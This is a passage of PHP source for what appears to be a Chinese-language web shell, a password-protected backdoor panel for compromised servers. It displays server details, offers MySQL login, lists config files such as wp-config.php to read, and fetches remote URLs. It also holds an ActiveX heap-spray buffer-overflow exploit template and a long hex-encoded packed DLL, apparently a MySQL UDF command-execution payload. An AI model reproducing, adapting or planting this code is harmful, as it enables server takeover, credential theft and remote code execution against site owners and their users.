            out += base64EncodeChars.charAt((c2 & 0xF) << 2);
            out += "=";
            break;
        }
        c3 = str.charCodeAt(i++);
        out += base64EncodeChars.charAt(c1 >> 2);
        out += base64EncodeChars.charAt(((c1 & 0x3) << 4) | ((c2 & 0xF0) >> 4));
        out += base64EncodeChars.charAt(((c2 & 0xF) << 2) | ((c3 & 0xC0) >> 6));
        out += base64EncodeChars.charAt(c3 & 0x3F);
    }
    return out;
}
function utf16to8(str) {
var out, i, len, c;
out = "";
len = str.length;
for(i = 0; i < len; i++) {
c = str.charCodeAt(i);
if ((c >= 0x0001) && (c <= 0x007F)) {
out += str.charAt(i);
} else if (c > 0x07FF) {
out += String.fromCharCode(0xE0 | ((c >> 12) & 0x0F));
out += String.fromCharCode(0x80 | ((c >> 6) & 0x3F));
out += String.fromCharCode(0x80 | ((c >> 0) & 0x3F));
} else {
out += String.fromCharCode(0xC0 | ((c >> 6) & 0x1F));
out += String.fromCharCode(0x80 | ((c >> 0) & 0x3F));
}
}
return out;
}
function utf8to16(str) {
  var out, i, len, c;
  var char2, char3;
  out = "";
  len = str.length;
  i = 0;
  while(i < len) {
    c = str.charCodeAt(i++);
    switch(c >> 4) {
      case 0: case 1: case 2: case 3: case 4: case 5: case 6: case 7:
        out += str.charAt(i-1);
        break;
      case 12: case 13:
        char2 = str.charCodeAt(i++);
        out += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F));
        break;
      case 14:
        char2 = str.charCodeAt(i++);
        char3 = str.charCodeAt(i++);
        out += String.fromCharCode(((c & 0x0F) << 12) |
        ((char2 & 0x3F) << 6) |
        ((char3 & 0x3F) << 0));
        break;
    }
  }
  return out;
}
');
}

function html_text($name,$cols,$rows,$value = ''){
	html_n("<br><br><textarea name=\"$name\" COLS=\"$cols\" ROWS=\"$rows\" >$value</textarea>");
}

function html_select($array,$mode = '',$change = '',$name = 'class'){
	html_n("<select name=$name $change>");
	foreach($array as $name => $value){
		if($name == $mode){
			html_n("<option value=\"$name\" selected>$value</option>");
		}else{
			html_n("<option value=\"$name\">$value</option>");
		}
	}
	html_n("</select>");
}

function html_font($color,$size,$name){
	html_n("<font color=\"$color\" size=\"$size\">$name</font>");
}

function GetHtml($url)
{
      $c = '';
      $useragent = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)';
      if(function_exists('fsockopen')){
    	$link = parse_url($url);
	    $query=$link['path'].'?'.$link['query'];
	    $host=strtolower($link['host']);
	    $port=$link['port'];
	    if($port==""){$port=80;}
	    $fp = fsockopen ($host,$port, $errno, $errstr, 10);
	    if ($fp)
	      {
		    $out = "GET /{$query} HTTP/1.0\r\n";
		    $out .= "Host: {$host}\r\n";
		    $out .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)\r\n";
		    $out .= "Connection: Close\r\n\r\n";
		    fwrite($fp, $out);
		    $inheader=1;
		    while(!feof($fp))
		         {$line=fgets($fp,4096);
			      if($inheader==0){$contents.=$line;}
			      if ($inheader &&($line=="\n"||$line=="\r\n")){$inheader = 0;}
		    }
		    fclose ($fp);
		    $c= $contents;
	      }
        }
		if(empty($c) && function_exists('curl_init') && function_exists('curl_exec')){
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
            curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
            $c = curl_exec($ch);
            curl_close($ch);
        }
        if(empty($c) && ini_get('allow_url_fopen')){
            $c = file_get_contents($url);
        }
		if(empty($c)){
            echo "document.write('<DIV style=\'CURSOR:url(\"$url\")\'>');";
        }
		if(!empty($c))
		{
        return $c;
		}
 }

function html_main()
{
	
    if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
        $hsafemode = "ON (开启)";
    } else {
        $hsafemode = "OFF (关闭)";
    }
    $Server_IP = gethostbyname($_SERVER["SERVER_NAME"]);
    $Server_OS = PHP_OS;
    $Server_Soft = $_SERVER["SERVER_SOFTWARE"];
    $web_server = php_uname();
    $title = $_SERVER["HTTP_HOST"] . "/Manager";
    html_n("<html><title>" . $title . "</title><table width='100%'><td align='center'><b>安全模式:{$hsafemode}-----{$Server_IP}-----{$Server_OS}-----{$Server_Soft}-----{$web_server}</b></td></table>");
    html_n("<table width='100%' height='95.7%' border=0 cellpadding='0' cellspacing='0'><tr><td width='170'><iframe name='left' src='?eanver=left' width='100%' height='100%' frameborder='0'></iframe></td><td><iframe name='main' src='?eanver=main' width='100%' height='100%' frameborder='1'></iframe></td></tr></table></html>");
}

function islogin($shellname,$myurl){
print<<<END
<style type="text/css">body,td{font-size: 12px;color:#00ff00;background-color:#000000;}input,select,textarea{font-size: 12px;background-color:#FFFFCC;border:1px solid #fff}.C{background-color:#000000;border:0px}.cmd{background-color:#000;color:#FFF}body{margin: 0px;margin-left:4px;}BODY {SCROLLBAR-FACE-COLOR: #232323; SCROLLBAR-HIGHLIGHT-COLOR: #232323; SCROLLBAR-SHADOW-COLOR: #383838; SCROLLBAR-DARKSHADOW-COLOR: #383838; SCROLLBAR-3DLIGHT-COLOR: #232323; SCROLLBAR-ARROW-COLOR: #FFFFFF;SCROLLBAR-TRACK-COLOR: #383838;}a{color:#ddd;text-decoration: none;}a:hover{color:red;background:#000}.am{color:#888;font-size:11px;}</style>
<body style="FILTER: progid:DXImageTransform.Microsoft.Gradient(gradientType=0,startColorStr=#626262,endColorStr=#1C1C1C)" scroll=no><center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href='{$myurl}' target='_blank'>{$shellname}</a><br><br><form method='post'>输入密码：<input name='postpass' type='password' size='22'> <input type='submit' value='登录'><br><br><br><font color=#3399FF>请勿用于非法用途，后果作者概不负责！</font><br></div></center>
END;
}

function html_sql(){
	html_input("text","sqlhost","localhost","<br>MYSQL地址","30");
	html_input("text","sqlport","3306","<br>MYSQL端口","30");
	html_input("text","sqluser","root","<br>MYSQL用户","30");
	html_input("password","sqlpass","","<br>MYSQL密码","30");
	html_input("text","sqldb","dbname","<br>MYSQL库名","30");
	html_input("submit","sqllogin","登录","<br>");
	html_n('</form>');
}

function Mysql_Len($data,$len)
{
	if(strlen($data) < $len) return $data;
	return substr_replace($data,'...',$len);
}

function html_n($data){
	echo "$data\n";
}

/*---css---*/

function css_img($img){
	$images = array(
	"exe"=>
	"R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7".
	"WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt".
	"xhIAOw==",
	"dir"=>"R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAA".
	"AAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdE".
	"oMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=",
	"txt"=>
	"R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ".
	"SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7".
	"UpPWG3Ig6Hq/XmRjuZwkAAA7",
	"html"=>
	"R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz".
	"c////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3P".
	"KIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDk".
	"Bkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIR".
	"ADs=",
	"js"=>
	"R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibH".
	"k0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhs".
	"a00AjYYBbc/o9HjNniUAADs=",
	"xml"=>
	"R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA".
	"gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
	"AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx".
	"OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ".
	"IQA7",
	"mp3"=>
	"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU".
	"aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc".
	"IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=",
	"img"=>
	"R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACA".
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci".
	"Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd".
	"FxEAOw==",
	"title"=>"R0lGODlhDgAOAMQAAOGmGmZmZv//xVVVVeW6E+K2F/+ZAHNzcf+vAGdnaf/AAHt1af+".
	"mAP/FAP61AHt4aXNza+WnFP//zAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
	"ACH5BAAHAP8ALAAAAAAOAA4AAAVJYPIcZGk+wUM0bOsWoyu35KzceO3sjsTvDR1P4uMFDw2EEkGUL".
	"I8NhpTRnEKnVAkWaugaJN4uN0y+kr2M4CIycwEWg4VpfoCHAAA7",
	"rar"=>"R0lGODlhEAAQAPf/AAAAAAAAgAAA/wCAAAD/AACAgIAAAIAAgP8A/4CAAP//AMDAwP///wAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/ACH5BAEKAP8ALAAAAAAQABAAAAiFAP0YEEhwoEE/".
    "/xIuEJhgQYKDBxP+W2ig4cOCBCcyoHjAQMePHgf6WbDxgAIEKFOmHDmSwciQIDsiXLgwgZ+b".
    "OHOSXJiz581/LRcE2LigqNGiLEkKWCCgqVOnM1naDOCHqtWbO336BLpzgAICYMOGRdgywIIC".
    "aNOmRcjVj02tPxPCzfkvIAA7"
	);
  header('Content-type: image/gif');
  echo base64_decode($images[$img]);
  die();
}

function css_showimg($file){
	$it=substr($file,-3);
	switch($it){
		case "jpg": case "gif": case "bmp": case "png": case "ico": return 'img';break;
		case "htm": case "tml": return 'html';break;
		case "exe": case "com": return 'exe';break;
		case "xml": case "doc": return 'xml';break;
		case ".js": case "vbs": return 'js';break;
		case "mp3": case "wma": case "wav": case "swf": case ".rm": case "avi":case "mp4":case "mvb": return 'mp3';break;
		case "rar": case "tar": case ".gz": case "zip":case "iso": return 'rar';break;
  	default: return 'txt';break;
	}
}

function css_js($num,$code = ''){
	if($num == "shellcode"){
		return '<%@ LANGUAGE="JavaScript" %>
		<%
		var act=new ActiveXObject("HanGamePluginCn18.HanGamePluginCn18.1");
		var shellcode = unescape("'.$code.'");
		var bigblock = unescape("%u9090%u9090");
		var headersize = 20;
		var slackspace = headersize+shellcode.length;
		while (bigblock.length<slackspace) bigblock+=bigblock;
		fillblock = bigblock.substring(0, slackspace);
		block = bigblock.substring(0, bigblock.length-slackspace);
		while(block.length+slackspace<0x40000) block = block+block+fillblock;
		memory = new Array();
		for (x=0; x<300; x++) memory[x] = block + shellcode;
		var buffer = "";
		while (buffer.length < 1319) buffer+="A";
		buffer=buffer+"\x0a\x0a\x0a\x0a"+buffer;
		act.hgs_startNotify(buffer);
		%>';
	}
	html_n('<script language="javascript">');
	if($num == "1"){
	html_n('	function rusurechk(msg,url){
		smsg = "FileName:[" + msg + "]\nPlease Input New File:";
		re = prompt(smsg,msg);
		if (re){
			url = url + re;
			window.location = url;
		}
	}
	function rusuredel(msg,url){
		smsg = "Do You Suer Delete [" + msg + "] ?";
		if(confirm(smsg)){
			URL = url + msg;
			window.location = url;
		}
	}
	function Delok(msg,gourl)
	{
		smsg = "确定要删除[" + unescape(msg) + "]吗?";
		if(confirm(smsg))
		{
			if(gourl == \'b\')
			{
				document.getElementById(\'actall\').value = escape(gourl);
				document.getElementById(\'fileall\').submit();
			}
			else window.location = gourl;
		}
	}
	function CheckAll(form)
	{
		for(var i=0;i<form.elements.length;i++)
		{
			var e = form.elements[i];
			if (e.name != \'chkall\')
			e.checked = form.chkall.checked;
		}
	}
	function CheckDate(msg,gourl)
	{
		smsg = "当前文件时间:[" + msg + "]";
		re = prompt(smsg,msg);
		if(re)
		{
			var url = gourl + re;
			var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/;
			var r = re.match(reg);
			if(r==null){alert(\'日期格式不正确!格式:yyyy-mm-dd hh:mm:ss\');return false;}
			else{document.getElementById(\'actall\').value = gourl; document.getElementById(\'inver\').value = re; document.getElementById(\'fileall\').submit();}
		}
	}
	function SubmitUrl(msg,txt,actid)
	{
		re = prompt(msg,unescape(txt));
		if(re)
		{
			document.getElementById(\'actall\').value = actid;
			document.getElementById(\'inver\').value = escape(re);
			document.getElementById(\'fileall\').submit();
		}
	}');
	}elseif($num == "2"){
	html_n('var NS4 = (document.layers);
var IE4 = (document.all);
var win = this;
var n = 0;
function search(str){
	var txt, i, found;
	if(str == "")return false;
	if(NS4){
		if(!win.find(str)) while(win.find(str, false, true)) n++; else n++;
		if(n == 0) alert(str + " ... Not-Find")
	}
	if(IE4){
		txt = win.document.body.createTextRange();
		for(i = 0; i <= n && (found = txt.findText(str)) != false; i++){
			txt.moveStart("character", 1);
			txt.moveEnd("textedit")
		}
		if(found){txt.moveStart("character", -1);txt.findText(str);txt.select();txt.scrollIntoView();n++}
		else{if (n > 0){n = 0;search(str)}else alert(str + "... Not-Find")}
	}
	return false
}
function CheckDate(){
	var re = document.getElementById(\'mtime\').value;
	var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/;
	var r = re.match(reg);
	var t = document.getElementById(\'charset\').value;
    t = t.toLowerCase();
	if(r==null){alert(\'日期格式不正确!格式:yyyy-mm-dd hh:mm:ss\');return false;}
	else{document.getElementById(\'newfile\').value = base64encode(document.getElementById(\'newfile\').value);
	if(t=="utf-8"){document.getElementById(\'txt\').value = base64encode(utf16to8(document.getElementById(\'txt\').value));}
');
if (substr(PHP_VERSION,0,1)>=5){html_n('if(t=="gbk" || t=="gb2312"){document.getElementById(\'txt\').value = base64encode(utf16to8(document.getElementById(\'txt\').value));}');}
html_n('
	document.getElementById(\'editor\').submit();}
}');
}elseif($num == "3"){
	html_n('function Full(i){
   if(i==0 || i==5){
     return false;
   }
  Str = new Array(12);
	Str[1] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\db.mdb";
	Str[2] = "Driver={Sql Server};Server=,1433;Database=DbName;Uid=sa;Pwd=****";
	Str[3] = "Driver={MySql};Server=;Port=3306;Database=DbName;Uid=root;Pwd=****";
	Str[4] = "Provider=MSDAORA.1;Password=密码;User ID=帐号;Data Source=服务名;Persist Security Info=True;";
	Str[6] = "SELECT * FROM [TableName] WHERE ID<100";
	Str[7] = "INSERT INTO [TableName](USER,PASS) VALUES(\'eanver\',\'mypass\')";
	Str[8] = "DELETE FROM [TableName] WHERE ID=100";
	Str[9] = "UPDATE [TableName] SET USER=\'eanver\' WHERE ID=100";
	Str[10] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";
	Str[11] = "DROP TABLE [TableName]";
	Str[12] = "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";
	Str[13] = "ALTER TABLE [TableName] DROP COLUMN PASS";
	if(i<=4){
	  DbForm.string.value = Str[i];
  }else{
  	DbForm.sql.value = Str[i];
  }
  return true;
  }');
}
elseif($num == "4"){
	html_n('function Fulll(i){
   if(i==0){
     return false;
   }
  Str = new Array(8);
	Str[1] = "config.inc.php";
	Str[2] = "config.inc.php";
	Str[3] = "config_base.php";
	Str[4] = "config.inc.php";
	Str[5] = "config.php";
	Str[6] = "wp-config.php";
	Str[7] = "config.php";
	Str[8] = "mysql.php";
	sform.code.value = Str[i];
  return true;
  }');
}
html_n('</script>');
}

function css_left(){
	html_n('<style type="text/css">
	.menu{width:152px;margin-left:auto;margin-right:auto;}
	.menu dl{margin-top:2px;}
	.menu dl dt{top left repeat-x;}
	.menu dl dt a{height:22px;padding-top:1px;line-height:18px;width:152px;display:block;color:#FFFFFF;font-weight:bold;
	text-decoration:none; 10px 7px no-repeat;text-indent:20px;letter-spacing:2px;}
	.menu dl dt a:hover{color:#FFFFCC;}
	.menu dl dd ul{list-style:none;}
	.menu dl dd ul li a{color:#000000;height:27px;widows:152px;display:block;line-height:27px;text-indent:28px;
	background:#BBBBBB no-repeat 13px 11px;border-color:#FFF #545454 #545454 #FFF;
	border-style:solid;border-width:1px;}
	.menu dl dd ul li a:hover{background:#FFF no-repeat 13px 11px;color:#FF6600;font-weight:bold;}
	</STYLE>');
	html_n('<script language="javascript">
	function getObject(objectId){
	 if(document.getElementById && document.getElementById(objectId)) {
	 return document.getElementById(objectId);
	 }
	 else if (document.all && document.all(objectId)) {
	 return document.all(objectId);
	 }
	 else if (document.layers && document.layers[objectId]) {
	 return document.layers[objectId];
	 }
	 else {
	 return false;
	 }
	}
	function showHide(objname){
	  var obj = getObject(objname);
	    if(obj.style.display == "none"){
			obj.style.display = "block";
		}else{
			obj.style.display = "none";
		}
	}
	</script><div class="menu">');
}

function css_main(){
	html_n('<style type="text/css">
	*{padding:0px;margin:0px;}
	body,td{font-size: 12px;color:#00ff00;background:#292929;}input,select,textarea{font-size: 12px;background-color:#FFFFCC;border:1px solid #fff}
	body{color:#FFFFFF;font-family:Verdana, Arial, Helvetica, sans-serif;
	height:100%;overflow-y:auto;background:#333333;SCROLLBAR-FACE-COLOR: #232323; SCROLLBAR-HIGHLIGHT-COLOR: #232323; SCROLLBAR-SHADOW-COLOR: #383838; SCROLLBAR-DARKSHADOW-COLOR: #383838; SCROLLBAR-3DLIGHT-COLOR: #232323; SCROLLBAR-ARROW-COLOR: #FFFFFF;SCROLLBAR-TRACK-COLOR: #383838;}
	input,select,textarea{background-color:#FFFFCC;border:1px solid #FFFFFF}
    a{color:#ddd;text-decoration: none;}a:hover{color:red;background:#000}
	.actall{background:#000000;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
	</STYLE><body style="table-layout:fixed; word-break:break-all; FILTER: progid:DXImageTransform.Microsoft.Gradient(gradientType=0,startColorStr=#626262,endColorStr=#1C1C1C)">
	<table width="85%" border=0 bgcolor="#555555" align="center">');
}

function css_foot(){
	html_n('</td></tr></table>');
}

function Mysql_shellcode()
{
	return "0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000F2950208B6F46C5BB6F46C5BB6F46C5B9132175BB4F46C5B9132115BB7F46C5B9132025BB4F46C5B9132015BBBF46C5B75FB315BB5F46C5BB6F46D5B9AF46C5B91321D5BB7F46C5B9132165BB7F46C5B9132145BB7F46C5B52696368B6F46C5B0000000000000000504500004C0103004E10A34D0000000000000000E00002210B010800001000000010000000600000D07B0000007000000080000000000010001000000002000004000000000000000400000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007882000008020000B0810000C800000000800000B001000000000000000000000000000000000000808400001000000000000000000000000000000000000000000000000000000000000000000000009C7D00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000E055505831000000000010000000700000000E000000040000000000000000000000000000400000E02E7273726300000000100000008000000006000000120000000000000000000000000000400000C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E303500555058210D09020947A37B47FAE6101946550000C90B000000200000260000A4FFFFFFFF8B4C240833C03901741656578B7C24146A0C59BE000010DCF3A566A55FB0015EAEFDBBFDC3C38B44240C1B6A071711108BF81933FFDFEDB7181DA45FC7011E12005E210883380175128B40040DF6776F0700750A1004C6000132C0C3540A6F2FF68D3C3054A455322D08FF30BFBDFBDDFF156D8885C05975085614C601011BC8568D7101FFDBB7FF8A114184D275F98B54142BCE890A32558BEC8B4D0C8339022D36D86F5374148B7D10915C54536F67EFF7EB4C8B417D740F1B707C1BEBE58366ECFFED6004001A0C8B48048B008D4401025072A037F2DD6E4E08891875113006A44CDD96EFEDEBB2B85F5E5DA3040C287408DBF6C79E33A8591353568B742410D8785346BB707B6B02B6460851C78D5C4357E824CEDDFD770AB81400C604070008FF70041E05767B43B2531A22C4185357200300544126E136086A995B420B7E780A84033B9859991A83EC0CFB5BFBEB9735D9576800F15CD66A018945FC06BB75DD7F8BF08B450CC60600326848C03733FF396DEDEF1E9C8B1D0590506A04FF75FC2AACD37D2EBCBD991CEB402DFC8D487E10402BC1B68D6DBF18F803C7505606F4348C2BF851BBB5B1BB3003FE5710940BD47DF44463EEC21741202F75BC131CA40B03FBFF803E0059741A8BC6C64437FF00567B14DF3AB68589B3066C18285F205E5BC9C3D6B6AE73F3C951F77D5247E3306DDB2CCB5008C9C26A98F0BF1726B4B710548D4601B23B5C4F08EDDB09EE56FF31BBA0947E0C6AFF8DC082B55D7B2082EE02F8092C0FDBC6C123005FEE5E6B6A0C125E58F886909609848365FC1D4550D0EB075BD85ED81B405F65E8C742FE24FF0D0BDB855F1FC9C24E3B0D08209602DBCEFEEDF3C3E908065556688000005680965608B8BFCB1F8485F65959A32354045075054BFEED762FAC8326004308166D083E0904C70424FF098FDD06075D0B5933C0CF5533ED3BC5750EDD7F85DD392D66107E2B6E1083F8018B0810DD7D77E1548B09DB57890A23440F85CC7964A118771C61C3058104C2385521234CEB0DF6DFB5184D9D051A3BC7741768E803A03CEE76C3B6FF57A1D396E7EB036645A12BB7FBFBB7480D6A025F74096A1FE056EB3C9E10C80460FADCF7C0C7051F015E1A50267FDF77B6C007581720BC04B81B4A5989F784A6B13D4BEDBC5504408312C97DEFD258851E6807E4DE4294BBBD7769FF321C57042618FF05E0BD6F6BDF5414F7D38ECD3DCAB6C6809DC90BBE55C75BD783BD10EBBEEBB91402740AB759BE8D1DB6EB4835713B78258BD885DBB8B410DB6C3414EED7E1F8EBF45F68DA4607C102DC83EF043BFB73F1530811C682CA067CAAB4307B1B8525E32D60C77C6C7CC9BC985B5DC20C3E1029286FB86F8D8B8FF28B5D081C73E433C9F04DBBD2894D376A2008683BF1751039FFC75688B60C17E426103BF0740583FE5BA1F5EE02752EB910D03BC148897FD0DB39F7773B837DE4000F8493F6115A037F147D27D99AA71280096227FEAC9DDD6D1324FB2057501357A72F8DF6BAD852D90611537C67BB617F6A0375434F34032168746D3CECB02E2C257FEB1BF0ECA3F0BD75BB09AAE05051595CE7F9413AB5D20B2F0F013D46DA761906292AE407C31B6D5B8DAEEC16FFD79A089A052CD0307CD600D688BC109B0C770DAB0C10051E5936C981ECE18F0D8628C55D2120BC211C895A3F3EECB8211889B3211438211041210C7DED6BDF668C183806252C062008A9344BB306050425001A6C63EDFBFC9C8F14309156240704ACFDB7F428F20807348B85E0FC9CA6B67B5B6370C201A11C19202413778E513A1809C9E0201C1DB37CEE25D38985D8320A04DC7E8D6F04FF24346879DF945963EC63B04128FAD40A2CE7BDC3B6DA20110823685B9E0A678D1B3068342F033C887C5CF81E9A5B6A144650C0C391C1B435D659E7F85A1B63ED324D3970D7619FB8363BFC37AC598B2E2827ADD0BA60D90AE0F3B903B16DFBDCE450352AA612DC0AE45440DB626C60D6D30FE009859710C3D4E5D107FB371DDAD984DCD166A09EC3BB0E6EFF1A65F7D81BC00359487EB8B018BF2DB1D57A0451E5735806B0D2CB2049C6F772F11F23C28E90672020CC00D0FA054727D281394D5A748BA1F09728EE973C03C1813850CE4936F85B69F04F1878180B010F941DC1FC3612C336844825C80FB74114121BDF0A0505710633D2EC57C9FABF9DF80818761E201D0C3BF972098B580803D9D4FEB758E07221C20183C0283BD672E660619241C0C2E970BA0330D0FD7AF00052996C59AB3DF94B7CC7365D50109C59112B29244F07E1F6C1E81FF7C3E00134EB202E00C1AC636B01A33D3EC0A2B11D85942845AB105805E3A491914C50AC2D13348483A1D287206DEADC35936B204A2CE7A309E1646DA91938DE09F3186C036D0C039B8D2BE0FAA8316AC1DA89F633C5508973810B796DEF0D139E04F064A337904DC3BBDBA9096900595FFA8BE55D51D8C3BB1BD810036803276850F9C4CEC2C5B28C3E1064F82D222D20F8FEA0BF4EE640BB1ABC1958D3BB86360D85C32C33B63F15101404EB605671F8E3C61E6BED448B75948E0B1033F00714EDCC95411899271CB0E0BED1DAF4330C11137507BE4F59C02FD12EE285F30AF7C1E0100BF006E1638F4400F7D607045E5F5B495C464646C6056064686C0064474674B00000472FEC0003360F201801FF7FFBFF4E6F20617267756D656E7473096C6C6F77656420287564663A206CDCDF76FF69625F6D7973716C0D5F73085F696E666F29396DFBFFC8182076657273696F6E20302E01341FBFBDDDFD45787065637447657861076C79201A6520737472B5ADB56F3F672074791B7572617105EC00B621722B747791FD36B0801F3F8672206E616D1D7BFB8148436F756C246E6F74C463618375DBB61320186D2779AF72F148A9DD44093F2003121013DF8B05F6E119216B07D0D6D5B0200F1F2D07293BAC7B05F90B0D17CC27DD099BB0070FD81F0928033C92E85E611F030F0313E944D9000000EC1B6814E5B119BF44FF00515565110FC9A8AAB200AA645455555532AA8EA22A195C03E07FFB0410020157616974466F725388BF35007E6C654F626A99145669727475FB9B03E0616C41760D536574456E7612B6DF01706F6EC05661726961622B41753700DE184372659454680664FBADFBB60D47264375727222502A636573734914F0C1660926135469636BDB7EB701DE6E6B5175657279500366840D80587B6D616E3716FDF6F6B3F70144697367374C6962727879436192B6D6FEDB731A4973446562756767266A6865DBDB76F746A4556E684064316445784670ADB0D8DB7469AF46696C4A1957D8B694B41254176D0DD86B0D6F321149900A6B409DB9E6DC766D70876547517F77B72C61AD5551221B5C7517DA76537973186DEE3941737365EDA161E10975697C4C7D5F686FDFED0A7E396D5F2E5F616D7367087869740BD86F7F0B646A753A5F66646976260ADC0F76A1639A5F64FD5F686F6F6B13B800B6D61459725F4875017C01D15F49735EC1